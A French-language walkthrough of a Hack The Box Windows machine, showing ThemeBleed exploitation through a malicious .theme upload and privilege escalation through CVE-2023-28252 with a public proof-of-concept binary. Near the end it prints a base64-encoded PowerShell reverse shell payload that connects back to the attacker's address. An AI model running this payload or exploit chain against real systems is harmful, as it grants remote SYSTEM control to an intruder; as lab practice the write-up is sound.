---
date: 2026-04-15
tags:
  - htb
  - medium
  - themebleed
  - cve-2023-28252
---


# Recon

scan tcp

<img width="936" height="323" alt="image" src="https://github.com/user-attachments/assets/5b384e81-61c2-4269-9a3e-671801a34939" />





# Exploit


## port 80

Je commence à regarder les headers HTTP. Cela me permet d'identifier des informations pouvant être utiles comme la technologie utilisée et les cookies.

<img width="960" height="334" alt="image" src="https://github.com/user-attachments/assets/d5fa5e70-751b-417a-bd60-022a8c4fd6b2" />



Sur la page, on y retrouve un site web où l'on peut uploader un fichier `.theme` ou `.themepack`.

<img width="1103" height="651" alt="image" src="https://github.com/user-attachments/assets/1a4f7238-ef86-4771-8fe6-858c02db2a6b" />


<img width="850" height="564" alt="image" src="https://github.com/user-attachments/assets/f3147fb4-6bd0-496f-aa41-bab077535bc1" />


<img width="654" height="307" alt="image" src="https://github.com/user-attachments/assets/1b62e54e-93d8-408b-a1b8-2c63ca5be663" />



Je n'ai pas réussi à trouver de manières d'accéder à l'ordinateur initialement. Il fallait faire une recherche sur "Windows 11 theme exploit", donnant la vulnérabilité ThemeBleed.

<img width="944" height="617" alt="image" src="https://github.com/user-attachments/assets/2fc8a577-3e80-4110-8bcb-13b6ecc76152" />



J'ai utilisé cet exploit me donnant une session à la cible.
https://github.com/Jnnshschl/CVE-2023-38146#

<img width="914" height="702" alt="image" src="https://github.com/user-attachments/assets/db354f8e-f7a2-4fa5-9f10-679c86c01c60" />


Il faut executer le script python en y donnant notre ip et port. Il faut ensuite ouvrir un listener.

<img width="946" height="467" alt="image" src="https://github.com/user-attachments/assets/b14561d1-a8b6-4433-a254-f868de0767cd" />


Ensuite, on y téléverse notre fichier `.theme` malicieux qui a été créé en roulant le script ThemeBleed. 

<img width="791" height="299" alt="image" src="https://github.com/user-attachments/assets/467f081f-ad33-4c58-a7d6-163ef28c3dc4" />



Et on y reçoit une connexion et on trouve le flag.

<img width="906" height="291" alt="image" src="https://github.com/user-attachments/assets/7ac90fa1-48f7-4feb-bed2-4f0b6e5e7734" />

<img width="883" height="635" alt="image" src="https://github.com/user-attachments/assets/f9bd9360-4f98-4169-b88b-157aac3b5844" />




# PrivEsc


Au début, j'ai vu qu'on avait des permissions dans le dossier `aero` et j'ai essayé de faire une élévation de privilège en hijackant le binaire `aero.exe`. Toutefois, ça n'a pas fonctionné.

<img width="752" height="439" alt="image" src="https://github.com/user-attachments/assets/fc8d5fed-6138-4880-af98-85f58c975905" />



<img width="815" height="274" alt="image" src="https://github.com/user-attachments/assets/d6b5313f-79c9-4d54-9f5e-bd2e2a7fc3e2" />





<img width="928" height="229" alt="image" src="https://github.com/user-attachments/assets/9599f084-3034-422f-a36b-9595130ede0b" />


<img width="755" height="377" alt="image" src="https://github.com/user-attachments/assets/f77a6ecb-5af0-461d-a4af-0aa4e67ba29e" />


<img width="1725" height="434" alt="image" src="https://github.com/user-attachments/assets/0960e5cc-31fc-4719-945c-1167e2750d92" />


Puisqu'on a les permissions de restart l'ordinateur, je l'ai fait mais je n'avais pas de connexion. Il fallait que je reset la machine.



Ensuite, sur le desktop, on trouve un PDF pour le CVE-2023-28252. Il faut valider qu'on a la version vulnérable de CLFS, et on l'a.

<img width="807" height="256" alt="image" src="https://github.com/user-attachments/assets/f8006365-bc1e-4b98-b881-138508d3fe7d" />




Je trouve cet exécutable pour avoir une élévation de privilège :
https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252?tab=readme-ov-file

<img width="818" height="313" alt="image" src="https://github.com/user-attachments/assets/3549878f-f7da-4dd4-9fbc-d76942c760f6" />



J'ai utilise un reverse shell de powershell comme payload.

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA5ADQAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAc
...
```



Après avoir téléversé l'exécutable, j'ouvre un listener et je roule le code.

<img width="961" height="277" alt="image" src="https://github.com/user-attachments/assets/4a3c9fbf-6cc2-4efa-a50c-6332d297c162" />


Je reçois une connexion comme SYSTEM et je suis capable de trouver le flag.

<img width="771" height="363" alt="image" src="https://github.com/user-attachments/assets/444bb870-74c6-4d76-9add-46be396102fc" />

<img width="673" height="279" alt="image" src="https://github.com/user-attachments/assets/77d5a29c-31ef-4fcf-aed0-eff8d84483bb" />


